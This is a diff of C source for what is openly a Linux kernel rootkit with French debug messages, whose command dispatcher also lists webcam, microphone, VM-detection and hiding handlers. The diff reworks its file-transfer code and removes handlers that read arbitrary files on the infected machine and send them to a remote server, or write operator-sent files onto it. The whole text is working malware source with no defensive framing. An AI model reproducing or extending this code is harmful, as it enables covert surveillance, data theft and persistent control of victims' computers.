@@ -18,6 +18,7 @@
 #include "passwd.h"
 #include "sysinfo.h"
 #include "upload.h"
+#include "download.h"
 #include "vanish.h"
 
 #define UPLOAD_BLOCK_SIZE 4096
@@ -47,8 +48,8 @@ static int start_webcam_handler(char *args);
 static int capture_image_handler(char *args);
 static int start_microphone_handler(char *args);
 static int play_audio_handler(char *args);
-static int upload_handler(char *args);
-static int download_handler(char *args);
+// static int upload_handler(char *args);
+// static int download_handler(char *args);
 static int sysinfo_handler(char *args);
 static int is_in_vm_handler(char *args);
 
@@ -156,6 +157,9 @@ int rootkit_command(char *command, unsigned command_size) {
         download_buffer = NULL;
         download_size = 0;
         sending_file = false;
+        DBG_MSG("rootkit_command: reception chunk upload (%u octets)\n", command_size);
+        return handle_upload_chunk(command, command_size);
+    } else if (download(command) == 0) {
         return 0;
     }
 
@@ -515,107 +519,5 @@ static int sysinfo_handler(char *args) {
 
     send_to_server(info);
     kfree(info);
-    return 0;
-}
-
-static int upload_handler(char *args) {
-    char *path_str = strsep(&args, " ");
-    char *size_str = args;
-
-    DBG_MSG("upload_handler: reçu avec args = '%s' et '%s'\n", path_str, size_str);
-
-    if (!path_str || !size_str) {
-        ERR_MSG("upload_handler: mauvais format d'arguments\n");
-        send_to_server("Usage: upload <remote_path> <size>\n");
-        return -EINVAL;
-    }
-
-    long size;
-    if (kstrtol(size_str, 10, &size) < 0 || size <= 0) {
-        ERR_MSG("upload_handler: taille invalide : %s\n", size_str);
-        send_to_server("Taille invalide.\n");
-        return -EINVAL;
-    }
-
-    if (receiving_file) {
-        ERR_MSG("upload_handler: tentative d'upload alors qu'un autre est en cours\n");
-        send_to_server("Upload déjà en cours.\n");
-        return -EBUSY;
-    }
-
-    upload_path = kstrdup(path_str, GFP_KERNEL);
-    if (!upload_path) {
-        ERR_MSG("upload_handler: échec kstrdup\n");
-        send_to_server("Erreur allocation chemin.\n");
-        return -ENOMEM;
-    }
-
-    upload_buffer = vmalloc(size);
-    if (!upload_buffer) {
-        ERR_MSG("upload_handler: échec allocation buffer (%ld octets)\n", size);
-        kfree(upload_path);
-        send_to_server("Erreur allocation mémoire fichier.\n");
-        return -ENOMEM;
-    }
-
-    upload_size = size;
-    upload_received = 0;
-    receiving_file = true;
-
-    DBG_MSG("upload_handler: prêt à recevoir %ld octets vers %s\n", size, upload_path);
-    send_to_server("READY");
-    return 0;
-}
-
-static int download_handler(char *args) {
-    if (!args || !*args) {
-        send_to_server("Usage: download <path>\n");
-        return -EINVAL;
-    }
-
-    DBG_MSG("download_handler: lecture fichier %s\n", args);
-
-    struct file *filp = filp_open(args, O_RDONLY, 0);
-    if (IS_ERR(filp)) {
-        ERR_MSG("download_handler: impossible d’ouvrir %s\n", args);
-        send_to_server("❌ Impossible d’ouvrir le fichier.\n");
-        return PTR_ERR(filp);
-    }
-
-    loff_t pos = 0;
-    int size = i_size_read(file_inode(filp));
-    if (size <= 0) {
-        filp_close(filp, NULL);
-        send_to_server("❌ Fichier vide ou erreur.\n");
-        return -EINVAL;
-    }
-
-    char *buffer = kmalloc(size, GFP_KERNEL);
-    if (!buffer) {
-        filp_close(filp, NULL);
-        send_to_server("❌ Mémoire insuffisante.\n");
-        return -ENOMEM;
-    }
-
-    int read_bytes = kernel_read(filp, buffer, size, &pos);
-    filp_close(filp, NULL);
-
-    if (read_bytes != size) {
-        ERR_MSG("download_handler: erreur lecture fichier (%d / %d)\n", read_bytes, size);
-        kfree(buffer);
-        send_to_server("❌ Erreur lecture fichier.\n");
-        return -EIO;
-    }
-
-    // Enregistrement du buffer pour envoi différé
-    download_buffer = buffer;
-    download_size = size;
-    sending_file = true;
-
-    char size_msg[64];
-    snprintf(size_msg, sizeof(size_msg), "SIZE %ld\n", download_size);
-    send_to_server(size_msg);
-
-    DBG_MSG("download_handler: prêt à envoyer %ld octets après READY\n", download_size);
     return 0;
 }
